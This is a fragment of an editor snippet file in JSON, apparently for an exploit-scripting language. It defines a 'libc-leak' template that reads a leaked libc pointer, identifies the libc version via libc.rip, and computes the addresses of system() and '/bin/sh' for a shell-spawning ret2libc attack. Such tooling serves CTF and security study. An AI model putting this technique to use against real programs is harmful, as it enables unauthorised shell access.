  "Libc Leak and Identify": {
    "prefix": "libc-leak",
    "body": [
      "// Leak libc address and identify version",
      "let leak = u64(recv(${1:conn}, 8))",
      "print(\"Leaked address: 0x\" + hex(leak))",
      "",
      "let matches = libc_search(\"${2:puts}\", leak)",
      "if len(matches) > 0 {",
      "    let libc = matches[0]",
      "    print(\"Found libc:\", libc.id)",
      "    ",
      "    let libc_base = leak - libc.symbols[\"${2:puts}\"]",
      "    let system = libc_base + libc.symbols[\"system\"]",
      "    let binsh = libc_base + libc.symbols[\"str_bin_sh\"]",
      "    ",
      "    print(\"libc base: 0x\" + hex(libc_base))",
      "    print(\"system(): 0x\" + hex(system))",
      "    print(\"/bin/sh: 0x\" + hex(binsh))",
      "}"
    ],
    "description": "Leak libc address and identify version with libc.rip"
  },
